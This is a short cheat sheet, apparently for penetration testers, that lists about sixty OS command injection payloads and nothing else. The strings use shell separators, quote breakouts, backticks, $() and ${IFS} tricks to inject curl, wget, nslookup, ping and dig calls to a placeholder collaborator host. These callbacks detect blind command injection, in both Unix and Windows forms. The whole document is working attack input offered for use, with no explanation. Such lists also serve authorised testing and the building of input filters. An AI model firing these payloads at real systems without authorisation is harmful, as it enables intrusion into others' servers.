## OS command injection Payloads:
```
; curl https://YOUR_COLLABORATOR #
; wget https://YOUR_COLLABORATOR #
; nslookup YOUR_COLLABORATOR #
; ping -c 3 YOUR_COLLABORATOR #
; dig YOUR_COLLABORATOR #
' ; curl https://YOUR_COLLABORATOR ; #
' ; wget https://YOUR_COLLABORATOR ; #
' ; nslookup YOUR_COLLABORATOR ; #
' ; ping -c 3 YOUR_COLLABORATOR ; #
' ; dig YOUR_COLLABORATOR ; #
" ; curl https://YOUR_COLLABORATOR ; #
" ; wget https://YOUR_COLLABORATOR ; #
" ; nslookup YOUR_COLLABORATOR ; #
" ; ping -c 3 YOUR_COLLABORATOR ; #
" ; dig YOUR_COLLABORATOR ; #
&& curl https://YOUR_COLLABORATOR #
&& wget https://YOUR_COLLABORATOR #
&& nslookup YOUR_COLLABORATOR #
&& ping -c 3 YOUR_COLLABORATOR #
&& dig YOUR_COLLABORATOR #
|| curl https://YOUR_COLLABORATOR #
|| wget https://YOUR_COLLABORATOR #
|| nslookup YOUR_COLLABORATOR #
|| ping -c 3 YOUR_COLLABORATOR #
|| dig YOUR_COLLABORATOR #
& curl https://YOUR_COLLABORATOR & rem
& wget https://YOUR_COLLABORATOR & rem
& nslookup YOUR_COLLABORATOR & rem
& ping -n 3 YOUR_COLLABORATOR & rem
' & curl https://YOUR_COLLABORATOR & rem
' & wget https://YOUR_COLLABORATOR & rem
' & nslookup YOUR_COLLABORATOR & rem
' & ping -n 3 YOUR_COLLABORATOR & rem
" & curl https://YOUR_COLLABORATOR & rem
" & wget https://YOUR_COLLABORATOR & rem
" & nslookup YOUR_COLLABORATOR & rem
" & ping -n 3 YOUR_COLLABORATOR & rem
&& curl https://YOUR_COLLABORATOR & rem
&& wget https://YOUR_COLLABORATOR & rem
&& nslookup YOUR_COLLABORATOR & rem
&& ping -n 3 YOUR_COLLABORATOR & rem
|| curl https://YOUR_COLLABORATOR & rem
|| wget https://YOUR_COLLABORATOR & rem
|| nslookup YOUR_COLLABORATOR & rem
|| ping -n 3 YOUR_COLLABORATOR & rem
`curl https://YOUR_COLLABORATOR`
`wget https://YOUR_COLLABORATOR`
`nslookup YOUR_COLLABORATOR`
`ping -c 3 YOUR_COLLABORATOR`
`dig YOUR_COLLABORATOR`
$(curl https://YOUR_COLLABORATOR)
$(wget https://YOUR_COLLABORATOR)
$(nslookup YOUR_COLLABORATOR)
$(ping -c 3 YOUR_COLLABORATOR)
$(dig YOUR_COLLABORATOR)
;curl${IFS}https://YOUR_COLLABORATOR;#
;wget${IFS}https://YOUR_COLLABORATOR;#
;nslookup${IFS}YOUR_COLLABORATOR;#
;ping${IFS}-c${IFS}3${IFS}YOUR_COLLABORATOR;#
;dig${IFS}YOUR_COLLABORATOR;#
``` 
